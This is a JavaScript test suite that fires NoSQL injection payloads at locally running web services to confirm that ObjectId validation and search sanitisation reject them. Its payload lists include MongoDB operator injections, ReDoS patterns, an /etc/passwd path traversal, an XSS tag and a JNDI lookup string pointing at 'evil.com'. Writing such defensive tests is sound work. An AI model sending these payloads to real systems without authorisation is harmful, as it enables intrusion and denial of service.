/**
 * Direct NoSQL Injection Security Testing Suite
 * Tests individual endpoint protections without middleware dependencies
 * Validates ObjectId validation and regex sanitization directly in code
 */

const axios = require("axios");
const colors = require("colors/safe");

// Test configuration
const BASE_URLS = {
  packages: "http://localhost:5000",
  vendors: "http://localhost:5001",
  guests: "http://localhost:5002",
  feedback: "http://localhost:3001",
};

// NoSQL injection attack payloads
const NOSQL_PAYLOADS = {
  objectIdInjection: '{"$ne": null}',
  regexInjection: ".*",
  operatorInjection: '{"$where": "function(){return true}"}',
  invalidObjectId: "invalid_id_123",
  malformedJson: '{"$ne"',
  bufferOverflow: "a".repeat(1000),
  specialChars: "../../../etc/passwd",
  scriptInjection: '<script>alert("xss")</script>',
  regexDoS: "(a+)+",
  longString: "x".repeat(200),
};

// Valid test ObjectId for comparison
const VALID_OBJECT_ID = "507f1f77bcf86cd799439011";

// Logging utility
const log = (message, color = "white", details = null) => {
  console.log(colors[color](message));
  if (details) {
    console.log(colors.gray(`   ${details}`));
  }
};

const logTest = (testName, passed, details = null) => {
  const status = passed ? "✅ BLOCKED" : "❌ VULNERABLE";
  const color = passed ? "green" : "red";

  log(`${status} ${testName}`, color);
  if (details) {
    log(`   ${details}`, "yellow");
  }
};

/**
 * Test 1: ObjectId Injection Protection
 * Tests all endpoints with ObjectId parameters
 */
const testObjectIdInjectionProtection = async () => {
  log("\n🎯 Testing ObjectId Injection Protection...", "blue");
  let passedTests = 0;
  let totalTests = 0;

  const objectIdEndpoints = [
    { url: `${BASE_URLS.packages}/package/`, desc: "Package GET endpoint" },
    { url: `${BASE_URLS.guests}/Guest/`, desc: "Guest detail endpoint" },
    { url: `${BASE_URLS.guests}/Admin/`, desc: "Admin detail endpoint" },
    {
      url: `${BASE_URLS.vendors}/getServiceDetail/`,
      desc: "Service detail endpoint",
    },
  ];

  for (const endpoint of objectIdEndpoints) {
    // Test each payload type
    for (const [payloadName, payload] of Object.entries(NOSQL_PAYLOADS)) {
      totalTests++;
      try {
        const response = await axios.get(
          `${endpoint.url}${encodeURIComponent(payload)}`,
          {
            validateStatus: () => true,
            timeout: 5000,
          }
        );

        // Should return 400 for invalid ObjectId formats
        const passed =
          response.status === 400 &&
          response.data &&
          (response.data.code === "INVALID_OBJECT_ID" ||
            response.data.error?.includes("Invalid") ||
            response.data.error?.includes("ID format"));

        logTest(
          `${endpoint.desc} blocks ${payloadName}`,
          passed,
          `Status: ${response.status}, Payload: ${payload.substring(0, 50)}...`
        );

        if (passed) passedTests++;
      } catch (error) {
        // Network errors are acceptable (blocked at network level)
        const passed =
          error.code === "ECONNABORTED" || error.code === "ECONNRESET";
        logTest(
          `${endpoint.desc} blocks ${payloadName}`,
          passed,
          `Network blocked: ${error.code || error.message}`
        );
        if (passed) passedTests++;
      }
    }
  }

  log(
    `\nObjectId Injection Tests: ${passedTests}/${totalTests} blocked`,
    passedTests >= totalTests * 0.8 ? "green" : "red"
  );
  return { passed: passedTests, total: totalTests };
};

/**
 * Test 2: Valid ObjectId Acceptance
 * Ensures valid ObjectIds still work correctly
 */
const testValidObjectIdAcceptance = async () => {
  log("\n✅ Testing Valid ObjectId Acceptance...", "blue");
  let passedTests = 0;
  let totalTests = 0;

  const validEndpoints = [
    {
      url: `${BASE_URLS.packages}/package/${VALID_OBJECT_ID}`,
      desc: "Package valid ObjectId",
    },
    {
      url: `${BASE_URLS.guests}/Guest/${VALID_OBJECT_ID}`,
      desc: "Guest valid ObjectId",
    },
    {
      url: `${BASE_URLS.guests}/Admin/${VALID_OBJECT_ID}`,
      desc: "Admin valid ObjectId",
    },
  ];

  for (const endpoint of validEndpoints) {
    totalTests++;
    try {
      const response = await axios.get(endpoint.url, {
        validateStatus: () => true,
        timeout: 5000,
      });

      // Should NOT return 400 for valid ObjectIds (might return 404 if not found, which is OK)
      const passed =
        response.status !== 400 ||
        !response.data?.code?.includes("INVALID_OBJECT_ID");

      logTest(
        `${endpoint.desc} accepts valid ObjectId`,
        passed,
        `Status: ${response.status}`
      );

      if (passed) passedTests++;
    } catch (error) {
      logTest(`${endpoint.desc} test failed`, false, error.message);
    }
  }

  log(
    `\nValid ObjectId Tests: ${passedTests}/${totalTests} passed`,
    passedTests === totalTests ? "green" : "red"
  );
  return { passed: passedTests, total: totalTests };
};

/**
 * Test 3: Search Query Injection Protection
 * Tests regex injection protection in search endpoints
 */
const testSearchQueryInjectionProtection = async () => {
  log("\n🔍 Testing Search Query Injection Protection...", "blue");
  let passedTests = 0;
  let totalTests = 0;

  const searchEndpoints = [
    {
      url: `${BASE_URLS.vendors}/searchServicebyCategory/`,
      desc: "Service category search",
    },
    {
      url: `${BASE_URLS.vendors}/searchServicebySubCategory/`,
      desc: "Service subcategory search",
    },
  ];

  const searchPayloads = [
    ".*", // ReDoS pattern
    "(a+)+", // Catastrophic backtracking
    ".*.*.*.*.*", // Multiple wildcards
    "^(?=.*\\.)(?=.*\\.).*$", // Complex lookahead
    "test[a-zA-Z0-9]*{100}", // Large quantifier
    "null\\u0000injection", // Null byte injection
    "<script>alert(1)</script>", // XSS in search
    "../../etc/passwd", // Path traversal
    "${jndi:ldap://evil.com/a}", // JNDI injection
  ];

  for (const endpoint of searchEndpoints) {
    for (const payload of searchPayloads) {
      totalTests++;
      try {
        const response = await axios.get(
          `${endpoint.url}${encodeURIComponent(payload)}`,
          {
            validateStatus: () => true,
            timeout: 3000, // Short timeout for ReDoS detection
          }
        );

        // Should return 400 for dangerous search patterns
        const passed =
          response.status === 400 &&
          response.data &&
          (response.data.code === "INVALID_SEARCH_CHARS" ||
            response.data.code === "INVALID_SEARCH_KEY" ||
            response.data.error?.includes("invalid characters"));

        logTest(
          `${endpoint.desc} blocks dangerous pattern`,
          passed,
          `Pattern: ${payload.substring(0, 30)}... Status: ${response.status}`
        );

        if (passed) passedTests++;
      } catch (error) {
        // Timeout indicates ReDoS protection is working
        const passed = error.code === "ECONNABORTED";
        logTest(
          `${endpoint.desc} blocks ReDoS pattern`,
          passed,
          `Timeout protection: ${error.code || error.message}`
        );
        if (passed) passedTests++;
      }
    }
  }

  log(
    `\nSearch Injection Tests: ${passedTests}/${totalTests} blocked`,
    passedTests >= totalTests * 0.7 ? "green" : "red"
  );
  return { passed: passedTests, total: totalTests };
};

/**
 * Test 4: Comprehensive Query Protection
 * Tests various NoSQL query injection techniques
 */
const testComprehensiveQueryProtection = async () => {
  log("\n🛡️ Testing Comprehensive Query Protection...", "blue");
  let passedTests = 0;
  let totalTests = 0;

  const queryInjectionTests = [
    {
      name: "JSON operator injection",
      payload: '{"$ne":""}',
      expectedBlock: true,
    },
    {
      name: "Where clause injection",
      payload: '{"$where":"return true"}',
      expectedBlock: true,
    },
    {
      name: "Regex injection",
      payload: '{"$regex":".*"}',
      expectedBlock: true,
    },
    {
      name: "JavaScript injection",
      payload: "function(){return true}",
      expectedBlock: true,
    },
    {
      name: "Buffer overflow attempt",
      payload: NOSQL_PAYLOADS.bufferOverflow,
      expectedBlock: true,
    },
  ];

  for (const test of queryInjectionTests) {
    totalTests++;
    try {
      // Test against package endpoint (most critical)
      const response = await axios.get(
        `${BASE_URLS.packages}/package/${encodeURIComponent(test.payload)}`,
        {
          validateStatus: () => true,
          timeout: 5000,
        }
      );

      const isBlocked =
        response.status === 400 &&
        response.data &&
        response.data.code === "INVALID_OBJECT_ID";

      const passed = test.expectedBlock ? isBlocked : !isBlocked;

      logTest(
        `Query protection: ${test.name}`,
        passed,
        `Status: ${response.status}, Expected: ${
          test.expectedBlock ? "blocked" : "allowed"
        }`
      );

      if (passed) passedTests++;
    } catch (error) {
      const passed = test.expectedBlock; // Network errors indicate blocking
      logTest(
        `Query protection: ${test.name}`,
        passed,
        `Network level block: ${error.code || error.message}`
      );
      if (passed) passedTests++;
    }
  }

  log(
    `\nComprehensive Protection Tests: ${passedTests}/${totalTests} passed`,
    passedTests >= totalTests * 0.8 ? "green" : "red"
  );
  return { passed: passedTests, total: totalTests };
};

/**
 * Main test runner
 */
const runDirectNoSQLInjectionTests = async () => {
  console.log(colors.cyan("\n🛡️ DIRECT NOSQL INJECTION PROTECTION TEST SUITE"));
  console.log(colors.cyan("================================================="));
  console.log(
    colors.gray("Testing individual endpoint protections without middleware\n")
  );

  const results = {
    objectId: { passed: 0, total: 0 },
    validId: { passed: 0, total: 0 },
    search: { passed: 0, total: 0 },
    comprehensive: { passed: 0, total: 0 },
  };

  try {
    results.objectId = await testObjectIdInjectionProtection();
    results.validId = await testValidObjectIdAcceptance();
    results.search = await testSearchQueryInjectionProtection();
    results.comprehensive = await testComprehensiveQueryProtection();

    // Summary
    const totalPassed = Object.values(results).reduce(
      (sum, r) => sum + r.passed,
      0
    );
    const totalTests = Object.values(results).reduce(
      (sum, r) => sum + r.total,
      0
    );
    const percentage = ((totalPassed / totalTests) * 100).toFixed(1);

    console.log(colors.cyan("\n📊 DIRECT NOSQL INJECTION TEST SUMMARY"));
    console.log(colors.cyan("========================================"));

    Object.entries(results).forEach(([category, result]) => {
      const categoryName = {
        objectId: "ObjectId Injection Protection",
        validId: "Valid ObjectId Acceptance",
        search: "Search Query Protection",
        comprehensive: "Comprehensive Query Protection",
      }[category];

      const status = result.passed >= result.total * 0.8 ? "✅" : "⚠️";
      console.log(
        `${status} ${categoryName}: ${result.passed}/${result.total}`
      );
    });

    console.log(colors.cyan("\n" + "=".repeat(50)));

    if (percentage >= 85) {
      console.log(
        colors.green(
          `🎉 EXCELLENT: ${totalPassed}/${totalTests} protections working (${percentage}%)`
        )
      );
      console.log(
        colors.green("🏆 Direct NoSQL injection protection achieved!")
      );
    } else if (percentage >= 70) {
      console.log(
        colors.yellow(
          `⚠️  GOOD: ${totalPassed}/${totalTests} protections working (${percentage}%)`
        )
      );
      console.log(
        colors.yellow(
          "📈 Most protections in place - minor improvements needed"
        )
      );
    } else {
      console.log(
        colors.red(
          `❌ NEEDS WORK: ${totalPassed}/${totalTests} protections working (${percentage}%)`
        )
      );
      console.log(
        colors.red("🔧 Significant NoSQL injection vulnerabilities remain")
      );
    }
  } catch (error) {
    console.log(colors.red(`\n💥 Test suite failed: ${error.message}`));
    console.log(colors.yellow("💡 Make sure all servers are running:"));
    Object.entries(BASE_URLS).forEach(([app, url]) => {
      console.log(
        colors.gray(
          `   - ${app.charAt(0).toUpperCase() + app.slice(1)} app: ${url}`
        )
      );
    });
  }
};

// Run tests if called directly
if (require.main === module) {
  runDirectNoSQLInjectionTests();
}

module.exports = {
  runDirectNoSQLInjectionTests,
  testObjectIdInjectionProtection,
  testValidObjectIdAcceptance,
  testSearchQueryInjectionProtection,
  testComprehensiveQueryProtection,
};
